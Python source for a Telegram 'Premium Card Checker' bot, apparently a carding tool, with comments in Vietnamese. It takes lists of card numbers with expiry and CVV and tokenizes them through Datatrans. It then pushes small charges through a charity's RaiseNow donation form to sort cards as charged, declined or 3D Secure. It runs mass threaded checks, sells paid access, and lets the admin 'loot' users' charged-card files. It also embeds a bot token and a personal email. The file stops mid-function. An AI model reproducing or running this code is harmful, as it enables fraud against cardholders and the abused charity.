import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
from datetime import datetime
from pytz import timezone
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CẤU HÌNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- TÊN FILE & THƯ MỤC LƯU TRỮ ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json"
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json" # File lưu ngôn ngữ
LOG_DIR = "check_logs" # Thư mục chính lưu log

# --- GIỚI HẠN MẶC ĐỊNH CHO THÀNH VIÊN ---
DEFAULT_MEMBER_LIMIT = 100
MEMBER_THREAD_LIMIT = 3

# --- CẤU HÌNH MÚI GIỜ ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BIẾN TOÀN CỤC ĐỂ THEO DÕI TÁC VỤ ĐANG CHẠY ---
ACTIVE_CHECKS = set()

# --- CẤU HÌNH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KHỞI TẠO ---
# Tạo thư mục log nếu chưa có
os.makedirs(LOG_DIR, exist_ok=True)

# --- QUẢN LÝ USER & DATA ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE)
    return prefs.get(str(user_id), None) # Trả về None nếu chưa set

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE)
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def update_user_stats(user_id, user_info, counts):
    """Cập nhật file thống kê chung cho các user."""
    stats = load_json_file(STATS_FILE)
    user_id_str = str(user_id)
    
    if user_id_str not in stats:
        stats[user_id_str] = {
            'username': user_info.username,
            'full_name': user_info.full_name,
            'total_charged': 0,
            'total_custom': 0,
            'total_decline': 0,
            'total_error': 0,
            'total_invalid': 0,
            'last_check_timestamp': ''
        }
    
    stats[user_id_str]['total_charged'] += counts.get('success', 0)
    stats[user_id_str]['total_custom'] += counts.get('custom', 0)
    stats[user_id_str]['total_decline'] += counts.get('decline', 0)
    stats[user_id_str]['total_error'] += counts.get('error', 0)
    stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
    stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
    
    save_json_file(STATS_FILE, stats)

# --- CÁC HÀM CỐT LÕI ---

def make_request_with_retry(session, method, url, max_retries=10, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Lần thử {attempt + 1}/{max_retries} cho {url} thất bại: {e}. Thử lại sau {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: Tất cả {max_retries} lần thử lại cho {url} đều thất bại. Lỗi cuối cùng: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "Số thẻ (CC) phải có từ 10-19 chữ số."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Tháng (MM) phải là số từ 1 đến 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "Năm (YY) phải có 2 hoặc 4 chữ số."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV phải có 3 hoặc 4 chữ số."
    return True, ""

def check_card(line):
    parts = line.strip().split('|')
    if len(parts) != 4:
        return 'invalid_format', line, "Dòng phải có 4 phần, ngăn cách bởi '|'", {}
    
    cc, mes, ano, cvv = [p.strip() for p in parts]

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    if len(ano) == 2: ano = f"20{ano}"
    
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    
    bin_info = {}

    try:
        # ---- BƯỚC 1: KIỂM TRA BIN ----
        bin_to_check = cc[:6]
        bin_url = f"https://bins.antipublic.cc/bins/{bin_to_check}"
        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10)
        if error: return 'error', line, f"Lỗi kiểm tra BIN: {error}", {}
        
        if bin_response.status_code == 200 and "not found" not in bin_response.text:
            try:
                data = bin_response.json()
                bin_info.update(data)
            except json.JSONDecodeError:
                logger.warning("Lỗi phân tích JSON từ BIN check.")
        
        # ---- BƯỚC 2: TOKENIZE THẺ ----
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
        
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
        if error: return 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if token_response.status_code != 200: return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
        
        try:
            token_data = token_response.json()
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError: return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        
        # ---- BƯỚC 3: THANH TOÁN ----
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20)
        if error: return 'error', line, f"Lỗi Payment: {error}", bin_info

        response_text = payment_response.text

        # ---- KIỂM TRA KEY ----
        if '"payment_status":"succeeded"' in response_text: return 'success', line, response_text, bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info

    except Exception as e: 
        logger.error(f"Lỗi không xác định trong check_card: {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống không xác định: {e}", bin_info

def create_progress_bar(current, total, length=10):
    if total == 0: return "[                   ] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '█' * filled_len + '░' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

# --- CÁC LỆNH BOT ---
async def start(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id) or 'en' # Mặc định là tiếng Anh nếu chưa chọn

    if user.id in load_users() or user.id == ADMIN_ID:
        if lang == 'vi':
            await update.message.reply_text(f"**Chào mừng trở lại, {user.first_name}!**\nDùng /help để xem các lệnh bạn có thể sử dụng.")
        else:
            await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        # Người dùng mới luôn thấy thông báo tiếng Anh
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** 🤖\n\n"
            "This bot utilizes a powerful `Charge 0.5$ Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            "Your Telegram ID: `{user_id}`\n\n"
            "**🌟 Upgrade to Premium! 🌟**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "✅ **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "✅ **Priority Support:** Get faster assistance from the admin.\n\n"
            "To get access and upgrade to Premium, please contact the admin with your ID: {admin_username}"
        ).format(user_id=user.id, admin_username=ADMIN_USERNAME)
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"🆔 ID Telegram của bạn là: `{update.effective_user.id}`")

async def get_help_text(user_id, lang_code):
    """Tạo nội dung help dựa trên vai trò và ngôn ngữ của user."""
    user_limit = get_user_limit(user_id)
    
    # --- Mẫu tin nhắn trợ giúp ---
    text_vi = {
        "public": (
            "**Bảng Lệnh Công Khai** 🛠️\n"
            "Chào mừng bạn! Dưới đây là các lệnh cơ bản bạn có thể sử dụng:\n\n"
            "🔹 `/start`\n"
            "   - *Mô tả:* Khởi động bot và nhận ID Telegram của bạn.\n"
            "   - *Sử dụng:* `/start`\n\n"
            "🔹 `/info`\n"
            "   - *Mô tả:* Lấy lại ID Telegram của bạn một cách nhanh chóng.\n"
            "   - *Sử dụng:* `/info`\n\n"
            "🔹 `/help`\n"
            "   - *Mô tả:* Hiển thị bảng trợ giúp này.\n"
            "   - *Sử dụng:* `/help`\n\n"
            f"**Nâng cấp Premium:**\nĐể sử dụng các tính năng check không giới hạn (`Charge 0.5$ Api Auth`), vui lòng liên hệ Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Bảng Lệnh Thành Viên** 👤\n"
            "Bạn đã được cấp quyền! Sử dụng các lệnh sau để check thẻ:\n\n"
            "🔹 `/cs <thẻ>`\n"
            "   - *Mô tả:* Kiểm tra một thẻ tín dụng duy nhất.\n"
            "   - *Định dạng thẻ:* `Số thẻ|Tháng|Năm|CVV`\n"
            "   - *Ví dụ:* `/cs 4031630741125602|11|2028|123`\n\n"
            "🔹 `/mass<số luồng> <file.txt>`\n"
            "   - *Mô tả:* Kiểm tra hàng loạt thẻ từ một tệp `.txt`.\n"
            "   - *Cách dùng:* Gửi tệp `.txt` và điền caption là `/mass` theo số luồng mong muốn.\n"
            "   - *Ví dụ:* Gửi file và ghi caption là `/mass3` để chạy 3 luồng.\n"
            "   - *Mặc định:* `/mass` (nếu không ghi số luồng).\n\n"
            f"💳 **Hạn mức của bạn:** `{user_limit}` lines/file (Free).\n"
            f"🌟 **Nâng cấp Premium:** Liên hệ {ADMIN_USERNAME} để check không giới hạn."
        )
    }
    
    text_en = {
        "public": (
            "**Public Command Menu** 🛠️\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "🔹 `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n"
            "   - *Usage:* `/start`\n\n"
            "🔹 `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n"
            "   - *Usage:* `/info`\n\n"
            "🔹 `/help`\n"
            "   - *Description:* Displays this help menu.\n"
            "   - *Usage:* `/help`\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features (`Charge 0.5$ Api Auth`), please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** 👤\n"
            "You are authorized! Use these commands to check cards:\n\n"
            "🔹 `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n"
            "   - *Card Format:* `CardNumber|Month|Year|CVV`\n"
            "   - *Example:* `/cs 4031630741125602|11|2028|123`\n\n"
            "🔹 `/mass<threads> <file.txt>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n"
            "   - *How to use:* Send a `.txt` file with this command as the caption.\n"
            "   - *Example:* Send a file with the caption `/mass3` to run with 3 threads.\n"
            "   - *Default:* `/mass` (if no thread count is specified).\n\n"
            f"💳 **Your Limit:** `{user_limit}` lines/file (Free).\n"
            f"🌟 **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }

    # Lệnh admin luôn là tiếng Việt
    admin_commands = (
        "**Bảng Lệnh Quản Trị Viên** 👑\n"
        "Toàn quyền quản lý bot với các lệnh sau:\n\n"
        "**Quản lý User:**\n"
        "🔹 `/add <user_id>`\n"
        "   - *Mô tả:* Cho phép một người dùng sử dụng bot.\n"
        "   - *Ví dụ:* `/add 123456789`\n\n"
        "🔹 `/ban <user_id>`\n"
        "   - *Mô tả:* Xóa quyền truy cập và toàn bộ log của người dùng.\n"
        "   - *Ví dụ:* `/ban 123456789`\n\n"
        "🔹 `/show`\n"
        "   - *Mô tả:* Hiển thị danh sách tất cả ID được phép và hạn mức của họ.\n"
        "   - *Sử dụng:* `/show`\n\n"
        "**Quản lý Giới hạn:**\n"
        "🔹 `/addlimit <user_id> <số>`\n"
        "   - *Mô tả:* Cộng thêm giới hạn số dòng check cho thành viên.\n"
        "   - *Ví dụ:* `/addlimit 123456789 500` (thêm 500 dòng vào limit hiện tại)\n\n"
        "**Giám sát & Lịch sử:**\n"
        "🔹 `/showcheck`\n"
        "   - *Mô tả:* Xem thống kê tổng quan về hoạt động check của tất cả user.\n"
        "   - *Sử dụng:* `/showcheck`\n\n"
        "🔹 `/lootfile <user_id>`\n"
        "   - *Mô tả:* Xem lịch sử các lần check file và tải lại kết quả của một user.\n"
        "   - *Ví dụ:* `/lootfile 123456789`\n"
    )

    lang_texts = text_vi if lang_code == 'vi' else text_en
    
    if user_id == ADMIN_ID:
        return f"{admin_commands}\n\n{text_vi['member'].split('💳 **Hạn mức của bạn:**')[0].strip()}"
    elif user_id in load_users():
        return f"{lang_texts['member']}\n\n{lang_texts['public']}"
    else:
        return lang_texts['public']

async def help_command(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id)

    if not lang:
        keyboard = [
            [
                InlineKeyboardButton("🇻🇳 Tiếng Việt", callback_data="setlang_vi"),
                InlineKeyboardButton("🇬🇧 English", callback_data="setlang_en"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Vui lòng chọn ngôn ngữ của bạn / Please select your language:",
            reply_markup=reply_markup
        )
    else:
        help_text = await get_help_text(user.id, lang)
        await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0]); users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"ℹ️ Người dùng `{user_to_add}` đã có trong danh sách.")
        else:
            users.add(user_to_add); save_users(users)
            await update.message.reply_text(f"✅ Đã thêm người dùng `{user_to_add}`.")
    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("Cú pháp: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0]); users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban); save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"🗑 Đã xóa người dùng `{user_to_ban}` và toàn bộ log.")
        else:
            await update.message.reply_text(f"ℹ️ Không tìm thấy người dùng `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("📭 Danh sách người dùng trống."); return
    
    message_lines = ["👥 **Danh sách ID & Hạn mức:**\n"]
    for user_id in sorted(list(users)):
        limit = get_user_limit(user_id)
        message_lines.append(f"- `{user_id}` | Hạn mức: `{limit}` lines")
        
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("Cú pháp: `/addlimit <user_id> <số_dòng_thêm>`"); return
    try:
        target_user_id_str = context.args[0]
        amount_to_add = int(context.args[1])
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
             raise ValueError("Dữ liệu không hợp lệ.")
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Dữ liệu không hợp lệ. Hãy chắc chắn ID và số lượng là số."); return

    limits = load_json_file(LIMIT_FILE)
    
    # Lấy limit hiện tại, đảm bảo nó là số nguyên
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    
    # Thực hiện phép cộng
    new_limit = old_limit + amount_to_add
    
    # Cập nhật và lưu lại
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"✅ **Cập nhật giới hạn thành công!**\n\n"
                                    f"👤 **User ID:** `{target_user_id_str}`\n"
                                    f"📈 **Giới hạn cũ:** `{old_limit}`\n"
                                    f"➕ **Đã thêm:** `{amount_to_add}`\n"
                                    f"📊 **Tổng mới:** `{new_limit}`")

async def cs_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users(): return
    if not context.args: await update.message.reply_text("Usage: `/cs cc|mm|yy|cvv`"); return
    
    line = " ".join(context.args)
    msg = await update.message.reply_text("⏳ *Checking your card, please wait...*")
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(check_card, line)
        status_map = {
            'success': ("✅ CHARGED 0.5$", "Transaction successful!"),
            'decline': ("❌ DECLINED", "Transaction declined by issuing bank."),
            'custom': ("🔒 3D SECURE", "3D Secure authentication required."),
            'invalid_format': ("📋 FORMAT ERROR", full_response),
            'error': ("❗️ ERROR", full_response),
            'unknown': ("❔ UNKNOWN", "Could not determine card status from response."),
        }
        status_text, response_message = status_map.get(status, status_map['unknown'])
        bin_str = (f"`{bin_info.get('bank', 'N/A')}`\n"
                   f"*- Country:* `{bin_info.get('country_name', 'N/A')}`\n"
                   f"*- Type:* `{bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')}`")
        final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                         f"**💳 Card:** `{original_line}`\n"
                         f"**🚦 Status: {status_text}**\n"
                         f"**💬 Response:** `{response_message}`\n\n"
                         f"**🏦 Gateway:** `Charge 0.5$ Auth Api`\n\n"
                         f"**ℹ️ BIN Info:**\n{bin_str}\n\n"
                         f"👤 *Checker by: @startsuttdow*")
        await msg.edit_text(final_message)
    except Exception as e:
        logger.error(f"Lỗi trong /cs: {e}", exc_info=True)
        await msg.edit_text(f"⛔️ **System Error:** `{e}`")

async def mass_check_handler(update, context):
    user = update.effective_user
    
    # --- CƠ CHẾ CHỐNG SPAM ---
    if user.id != ADMIN_ID:
        if user.id in ACTIVE_CHECKS:
            logger.warning(f"User {user.id} ({user.full_name}) tried to start a new check while one is already running.")
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=(
                    f"⚠️ **Cảnh báo Spam** ⚠️\n\n"
                    f"Thành viên `{user.id}` ({user.full_name or 'N/A'}) đang cố gắng gửi file mới trong khi một tác vụ check khác của họ đang chạy."
                )
            )
            return # Dừng xử lý file mới, không báo cho member

    if user.id != ADMIN_ID and user.id not in load_users(): return
    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)

    if not lines: await update.message.reply_text("📂 The file is empty."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            # Sửa thông báo tại đây
            await update.message.reply_text(
                f"⛔️ **Vượt quá giới hạn Free!**\n\n"
                f"Tệp của bạn có `{total_lines}` dòng, nhưng giới hạn cho mỗi lần check là `{user_limit}` dòng.\n\n"
                f"💡 **Lưu ý:** Bot sẽ chỉ chạy nếu tệp của bạn có từ `{user_limit}` dòng trở xuống.\n\n"
                f"Nếu muốn tăng hạn mức, vui lòng liên hệ admin {ADMIN_USERNAME}."
            )
            return

    caption = update.message.caption or "/mass"
    
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match else 10

    num_threads = requested_threads

    if user.id != ADMIN_ID:
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"⚠️ **Giới hạn luồng!**\nThành viên chỉ được sử dụng tối đa {MEMBER_THREAD_LIMIT} luồng. Đã tự động điều chỉnh.",
                quote=True
            )
            num_threads = MEMBER_THREAD_LIMIT
        num_threads = max(1, num_threads)
    else:
        num_threads = max(1, min(50, requested_threads))

    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    status_message = await update.message.reply_text(f"⏳ Initializing... Checking `{total_lines}` cards with `{num_threads}` threads.")
    
    try:
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.add(user.id)

        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                status, original_line, full_response, bin_info = future.result()
                
                counts[status] = counts.get(status, 0) + 1
                
                bin_str = f"| {bin_info.get('bank', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} - {bin_info.get('country_name', 'N/A')}"
                
                line_to_save = f"{original_line} {bin_str}"
                if status == 'invalid_format':
                    line_to_save = f"{original_line} | Reason: {full_response}"
                
                result_lists[status].append(line_to_save)

                if status == 'error' or status == 'unknown':
                    debug_info = f"Card: {original_line}\nResponse: {full_response[:3500]}"
                    result_lists['error_debug'].append(debug_info)
                    if user.id != ADMIN_ID:
                        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🐞 DEBUG ALERT từ user {user.id}\n{debug_info}")

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (f"**🚀 Checking in progress...**\n{progress_bar}\n"
                                   f"**Progress:** `{processed_count}/{total_lines}` | **Threads:** `{num_threads}`\n\n"
                                   f"✅ **Charged:** `{counts['success']}`\n"
                                   f"❌ **Declined:** `{counts['decline']}`\n"
                                   f"🔒 **3D Secure:** `{counts['custom']}`\n"
                                   f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
                                   f"❔ **Errors:** `{counts['error']}`")
                    try: await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest: pass
                    last_update_time = time.time()
        
        # Construct the final summary message
        final_summary_text = (
            f"**📊 Check Complete!**\n\n"
            f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n\n"
            f"✅ **Charged:** `{counts['success']}`\n"
            f"❌ **Declined:** `{counts['decline']}`\n"
            f"🔒 **3D Secure:** `{counts['custom']}`\n"
            f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
            f"❔ **Errors:** `{counts['error']}`"
        )
        
        # Edit the status message to show the final summary
        await status_message.edit_text(final_summary_text)

        # Save summary data and update stats
        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        
        update_user_stats(user.id, user, counts)

        file_map = {
            'success': 'charged.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(result_lists[status]))
                await context.bot.send_document(chat_id=update.effective_chat.id, document=open(file_path, 'rb'))

        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f:
                f.write("\n\n---\n\n".join(result_lists['error_debug']))
            await context.bot.send_document(chat_id=ADMIN_ID, document=open(debug_path, 'rb'))

    except Exception as e:
        logger.error(f"Lỗi trong mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!** `{e}`")
    finally:
        # Đảm bảo user được xóa khỏi danh sách active sau khi check xong hoặc gặp lỗi
        if user.id != ADMIN_ID:
            ACTIVE_CHECKS.discard(user.id)

# --- CÁC LỆNH ADMIN MỚI ---
async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("Chưa có dữ liệu thống kê nào."); return
    
    message = "📊 **THỐNG KÊ CHECK CỦA USER** 📊\n\n"
    
    # Lấy danh sách tất cả user được cấp quyền và cả admin
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)

    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str) # Lấy data nếu có

        if data:
            user_display = f"@{data.get('username')}" if data.get('username') else f"ID: {user_id_str}"
            message += (f"👤 **{user_display}** (`{user_id_str}`)\n"
                        f"  ✅ Charged: `{data.get('total_charged', 0)}`\n"
                        f"  🔒 Custom: `{data.get('total_custom', 0)}`\n"
                        f"  ❌ Declined: `{data.get('total_decline', 0)}`\n"
                        f"  ❔ Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                        f"  🕒 Lần cuối: `{data.get('last_check_timestamp', 'Chưa check')}`\n"
                        f"--------------------\n")
        else:
            # User chưa từng check
            message += (f"👤 **ID: {user_id_str}**\n"
                        f"  *Chưa từng check.*\n"
                        f"--------------------\n")
    
    await update.message.reply_text(message)

async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"Không tìm thấy lịch sử check nào cho người dùng `{target_user_id}`."); return
        
    keyboard = [
        [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Chọn một tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)

async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')
    command = data[0]
    action = data[1]
    
    # --- Xử lý nút chọn ngôn ngữ ---
    if command == "setlang":
        user_id = query.from_user.id
        lang_code = action # 'vi' or 'en'
        set_user_lang(user_id, lang_code)
        
        help_text = await get_help_text(user_id, lang_code)
        await query.edit_message_text(help_text, disable_web_page_preview=True)
        return

    # --- Xử lý các nút /lootfile ---
    target_user_id = data[2] if len(data) > 2 else None

    # Main loot menu
    if command == "loot" and action == "mainmenu":
        keyboard = [
